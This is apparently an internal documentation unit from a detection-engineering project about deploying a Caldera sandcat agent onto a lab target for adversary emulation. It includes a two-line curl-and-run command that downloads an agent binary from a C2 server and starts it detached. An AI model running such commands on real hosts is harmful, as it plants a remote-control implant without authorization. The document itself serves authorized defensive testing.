---
id: unit-corpus-injection-on-the-target-from-the-lab-network
kind: what
title: "corpus_injection \u2014 on the target, from the lab network"
sources:
- type: code
  path: scripts/caldera_emulate.py
last_generated_commit: 2f35b5ad508cd284e75ad0735ab7db02961001dd
claims: []
confidence: high
tags:
- verified-v1
created_at: 1784946220.586659
updated_at: 1784946220.586659
---

Deploying a sandcat agent onto a lab target is a two-command operation from
inside the lab network: download the agent binary from Caldera's file endpoint
and start it against the Caldera server. The driver-side assumptions that make
this work are visible in `scripts/caldera_emulate.py` — agents must be checked
in on the lab network (`resolve_agent_hosts` filters on `in_lab`), and the
operation is launched with `auto_close` and the atomic planner.

```bash
curl -s -X POST -H "file:sandcat.go" -H "platform:linux" \
     http://10.10.11.60:8888/file/download -o /tmp/p5agent
chmod +x /tmp/p5agent && setsid /tmp/p5agent -server http://10.10.11.60:8888 -group red &
```

Profiles are built against Caldera's `/api/v2/adversaries` endpoint by listing
atomic_ordering ability ids, so the emulation targets techniques the detection
library covers rather than stock adversaries.

## Why

The agent download is the only manual step in the whole lane, so the script
keeps the rest reproducible: every later stage — operation start, link wait,
collect, ship, index confirmation — is driven by `caldera_emulate.py` from that
one checked-in agent. Keeping the deployment to a one-liner is deliberate,
because the sandcat agent lives in `/tmp` and does not survive a target
rollback, so it will be redeployed often.
